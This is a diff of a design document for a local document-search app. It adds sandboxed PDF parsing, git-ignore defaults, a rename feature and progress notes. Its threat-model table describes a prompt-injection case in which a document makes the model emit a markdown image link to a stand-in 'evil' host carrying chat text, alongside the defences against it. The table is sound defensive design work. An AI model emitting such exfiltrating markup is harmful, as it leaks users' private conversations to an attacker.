@@ -48,9 +48,11 @@ Guiding principles:
 | Reference integrity | Every fact ID and chunk reference is resolved and checked; unresolvable ones are excluded and reported | 13 |
 | UI | Four tabs (Ask, Search, Library, Second Brain), a File menu, and Settings | 15 |
 | One instance | Only one copy of localrag runs at a time, with one workspace active. A second `serve` opens the running one; CLI commands that write refuse while it runs | 4 |
-| Workspace picker | On first load the UI lists known workspaces to choose from. With none known, it asks where to create one. The File menu has New / Open / Recent | 4, 15 |
+| Workspace picker | On first load the UI lists known workspaces to choose from. With none known, it asks where to create one; the location can only be picked with the macOS folder chooser, never typed. The File menu has New / Open / Recent | 4, 15 |
 | Adding documents | Library → **Add documents…** uploads into `corpus/` and triggers indexing. Only `.pdf`/`.md`/`.txt`; each file is parsed first and refused with a specific reason if it fails | 15 |
-| Git safety | `.localrag/` ignores itself in git; secrets are never stored in a workspace (§14) | 4, 14 |
+| Git safety | `.localrag/` and `corpus/` each ignore themselves in git; secrets are never stored in a workspace (§14) | 4, 14 |
+| PDF parsing | PDFium runs only in a separate helper process (`localrag-pdf`), sandboxed with no network and no file writes. A crash or hang fails that one file | 14 |
+| Renaming documents | Library → **Rename** changes the file name only (the extension is fixed), with no reindex. References to the name are updated: document path, chat-history citations, eval set | 15 |
 
 ## 3. Platform & tech stack
 
@@ -125,9 +127,10 @@ my-research-topic/                ← workspace root
 
 - **Only `corpus/` is indexed.** `brain/` sits outside it so a brain can never be cited as a
   source.
-- **`.localrag/.gitignore`** contains `*`, written on `init` and re-checked on every open. Git
-  therefore ignores the whole state folder in any repository, including one created after the
-  workspace (verified with a later `git init`; only `corpus/` files were staged).
+- **`.localrag/.gitignore` and `corpus/.gitignore`** each contain `*`. They're written on
+  `init` and on every open if missing; an existing one is left alone, so you can delete or edit
+  it to version your documents. Git therefore ignores both folders in any repository,
+  including one created after the workspace.
 - **Global config** `~/.config/localrag/config.toml` holds machine-wide settings: Ollama host,
   default models, and `crossref_email`. Workspace config overrides the defaults. The global
   cache `~/.cache/localrag/crossref/` holds metadata responses.
@@ -717,10 +720,11 @@ resolved against the index, in order:
 | Workspace in a git repo | `.localrag/` holds `index.db` (chat history, extracted text of every document), OCR text, eval logs and settings. Before, it was only ignored if a repo already existed at `init` | **Fixed:** `.localrag/.gitignore` with `*` ignores it in any repo, now or later |
 | Email / API keys in a repo | — | **Safe by design:** the Crossref email lives in the global `~/.config/localrag/config.toml`, never in a workspace. Future API keys go in the **macOS Keychain**, never a config file; no secret is ever read from workspace config |
 | Global config readable by others | Email, known workspace paths, launch token | **Fixed:** `~/.config/localrag/` is 0700; its files are 0600 and written atomically |
-| `corpus/` and `brain/` in a public repo | Papers may be copyrighted or private; brains quote them | **Your call:** they are *not* auto-ignored, since versioning them can be useful. If the repo is or may become public, add `corpus/` (and `brain/`) to the repo's `.gitignore`, or keep the repo private |
+| `corpus/` in a public repo | Papers may be copyrighted or private | **Fixed:** `corpus/.gitignore` (`*`) ignores the documents by default; delete it to version them deliberately |
+| `brain/` in a public repo (Phase 7) | Brain files quote documents | Not auto-ignored yet; decide when Phase 7 is built |
 | CSRF / DNS rebinding | Websites driving the local API | Host check, Origin check, per-launch token in an HttpOnly SameSite=Strict per-port cookie |
 | Prompt injection exfiltrating data | A document tells the model to emit `![](https://evil/?q=<chat>)` | CSP `img-src 'self' data: blob:` and `connect-src 'self'` block remote loads; model output goes through DOMPurify |
-| Malicious PDFs | PDF.js font-code execution (CVE-2024-4367 class); PDFium memory bugs | PDF.js 4.10.38 with `isEvalSupported: false`. PDFium is hardened by Chrome but runs in-process. **Later:** parse in a separate helper process so a crash or exploit can't reach the server |
+| Malicious PDFs | PDF.js font-code execution (CVE-2024-4367 class); PDFium memory bugs | PDF.js 4.10.38 with `isEvalSupported: false`. **PDFium runs only in `localrag-pdf`, a helper process started per request under `sandbox-exec`** (no network, no file writes; verified). A crash comes back as "the PDF parser crashed on this file (signal N)", a hang is killed after a timeout, and either way only that file is marked failed. The server process never loads PDFium |
 | Uploaded files rendered as HTML | A `.txt` full of `<script>` | Served as `text/plain` with `X-Content-Type-Options: nosniff`, by document id only |
 | Clickjacking / referrer leaks | — | `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` on data |
 | Upload abuse | Path traversal, huge bodies, half-written files | Basename only (no `/`, `\`, leading dot); extension allowlist; parse before write; atomic rename with unique temp names; size cap |
@@ -771,8 +775,9 @@ One page with four tabs, a File menu, a Settings panel, and first-load dialogs.
   - **Workspace picker**, when no workspace is active. It lists known workspaces (Open, or ×
     to drop one from the list without touching the folder), **Open another folder…**, and
     **New workspace**.
-  - **New workspace** takes a location (typed, or **Choose…** for the native macOS folder
-    chooser) and a folder name. A non-empty existing folder is never overwritten.
+  - **New workspace** takes a location chosen with **Choose…** (the native macOS folder
+    chooser; the field can't be typed into) and a folder name. A non-empty existing folder is
+    never overwritten.
   - If no workspaces are known, the dialog opens on "Create your first workspace". It can't
     be dismissed until a workspace is open.
   - Then the Crossref email dialog, if no email is set (§7).
@@ -798,6 +803,17 @@ One page with four tabs, a File menu, a Settings panel, and first-load dialogs.
     - Accepted files are written atomically (hidden temp name, then rename). Name clashes
       become `name (2).pdf`. The file reports its pages and any scanned pages, and indexing
       starts (queued if a sync is running).
+  - **Rename** (any document still in `corpus/`):
+    - Edits the name inline. The extension is shown as a fixed suffix, because changing the
+      type would mean reindexing.
+    - The file is renamed in place and nothing is reindexed: content, hash, chunks and vectors
+      are unchanged, and the next sync sees nothing to do.
+    - Updated in one transaction:
+      - the document's path
+      - chat-history citation snapshots for that path (their labels too, when the label came
+        from the file name)
+      - `eval.jsonl` questions whose `expected_doc` matched only the old name
+    - Refused while indexing runs, for a name that's taken, or a changed extension.
   - Documents with status and metadata source.
   - Actions: Run OCR, Forget (removed only, confirmed), Forget all removed, edit metadata,
     confirm/reject a Crossref match, refresh metadata, reindex.
@@ -995,6 +1011,14 @@ Rule: `core` knows nothing about HTTP. The server, CLI, app and agent are thin s
     - Bug found by the browser test: two connections opening a brand-new database raced to
       create the schema. The migration now takes SQLite's write lock (`BEGIN IMMEDIATE`) and
       re-reads the version.
+  - **Follow-up 2:**
+    - PDF helper process with sandbox. `doctor` now checks parsing, character boxes and
+      rendering through it.
+    - Self-ignoring `corpus/`; a location that can only be chosen; Rename without reindex.
+    - 50 tests pass.
+    - Bug found: switching a brand-new database to WAL could return "database is locked"
+      under concurrent opens without waiting; the open sequence now retries busy errors
+      briefly.
   - **Not yet:**
     - The Settings panel and Crossref email dialog (Phase 4).
     - Search filters by document or year (need Phase 4 metadata).
@@ -1032,8 +1056,9 @@ Rule: `core` knows nothing about HTTP. The server, CLI, app and agent are thin s
 
 ## 19. Packaging & distribution
 
-- **Build:** `aarch64-apple-darwin` only. Tauri 2 bundles the UI, the in-process server and
-  `libpdfium.dylib` (in `Contents/Frameworks`) into a `.app` inside a `.dmg`.
+- **Build:** `aarch64-apple-darwin` only. Tauri 2 bundles the UI, the in-process server, the
+  `localrag-pdf` helper (next to the main executable) and `libpdfium.dylib` (in
+  `Contents/Frameworks`) into a `.app` inside a `.dmg`.
 - **First-run checks:**
   - Is Ollama installed and running? If not, link to the installer.
   - Is `qwen3-embedding:0.6b` present? If not, pull it via `/api/pull` with progress.
